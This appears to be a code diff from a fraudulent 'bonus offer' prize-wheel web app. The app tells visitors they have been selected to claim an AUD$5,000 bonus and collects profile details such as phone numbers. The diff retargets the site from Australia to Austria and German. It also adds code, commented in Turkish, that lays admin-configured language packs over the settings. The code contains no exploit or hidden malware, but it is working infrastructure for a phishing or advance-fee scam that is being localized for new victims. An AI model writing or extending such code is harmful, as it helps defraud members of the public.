@@ -93,7 +93,7 @@ const LEGACY_GENERIC_PORTAL_NAME = "Customer Portal";
 const LEGACY_GENERIC_SUPPORT = "Customer Support";
 const LEGACY_GENERIC_WIN_TITLE = "Exclusive Bonus Offer";
 const LEGACY_GENERIC_WIN_SUBTITLE = "Congratulations! You have been selected for today's national promotion. Click the button below to claim your AUD$5,000 bonus.";
-const ENGLISH_DEFAULTS = translations.en;
+const ENGLISH_DEFAULTS = translations.de || translations.en;
 const ENGLISH_SUPPORT_CENTER_NAME = ENGLISH_DEFAULTS.support_center_name;
 const ENGLISH_PORTAL_NAME = ENGLISH_DEFAULTS.portal_name;
 const ENGLISH_WIN_TITLE = ENGLISH_DEFAULTS.win_title;
@@ -150,6 +150,17 @@ const ENGLISH_PROFILE_LOADING_TEXT = ENGLISH_DEFAULTS.profile_loading_text;
 function normalizeBranding(settings: LegacyGlobalSettings): Partial<GlobalSettings> {
   const next = { ...settings };
   const nextWheelSettings = { ...(next.wheel_settings ?? {}) };
+
+  // Admin "Dil Ayarlari" -> translations JSONB icindeki 'de' paketi ustune yazilir
+  const dbTranslations = (settings as { translations?: Record<string, Record<string, unknown>> }).translations;
+  const langPack = dbTranslations?.de ?? dbTranslations?.en;
+  if (langPack && typeof langPack === "object") {
+    for (const [k, v] of Object.entries(langPack)) {
+      if (typeof v === "string" && v.trim()) {
+        (next as Record<string, unknown>)[k] = v;
+      }
+    }
+  }
 
   if (!next.bg_url && next.background_url) {
     next.bg_url = next.background_url;
@@ -208,14 +219,14 @@ function normalizeBranding(settings: LegacyGlobalSettings): Partial<GlobalSettin
     next.target_country === "Netherlands" ||
     next.target_country === "New Zealand"
   ) {
-    next.target_country = "Australia";
+    next.target_country = "Austria";
   }
 
-  if (next.site_language && next.site_language !== "en") {
-    next.site_language = "en";
+  if (next.site_language && next.site_language !== "de") {
+    next.site_language = "de";
   }
 
-  if (next.target_country === "Australia") {
+  if (next.target_country === "Austria") {
     next.bg_url = AUSTRALIA_BG_URL;
     nextWheelSettings.bg_url_mobile = AUSTRALIA_BG_URL_MOBILE;
     nextWheelSettings.page_backgrounds = {};
@@ -302,8 +313,8 @@ function normalizeBranding(settings: LegacyGlobalSettings): Partial<GlobalSettin
   if (!next.profile_phone_label) next.profile_phone_label = ENGLISH_PROFILE_PHONE_LABEL;
   if (!next.profile_button) next.profile_button = ENGLISH_PROFILE_BUTTON;
   if (!next.profile_loading_text) next.profile_loading_text = ENGLISH_PROFILE_LOADING_TEXT;
-  if (!next.site_language) next.site_language = "en";
-  if (!next.target_country) next.target_country = "Australia";
+  if (!next.site_language) next.site_language = "de";
+  if (!next.target_country) next.target_country = "Austria";
 
   return next;
 }
@@ -347,8 +358,8 @@ export const defaultSettings: GlobalSettings = {
   profile_phone_label: ENGLISH_PROFILE_PHONE_LABEL,
   profile_button: ENGLISH_PROFILE_BUTTON,
   profile_loading_text: ENGLISH_PROFILE_LOADING_TEXT,
-  site_language: "en",
-  target_country: "Australia",
+  site_language: "de",
+  target_country: "Austria",
   wheel_settings: {
     bg_url_mobile: AUSTRALIA_BG_URL_MOBILE,
     page_backgrounds: {},
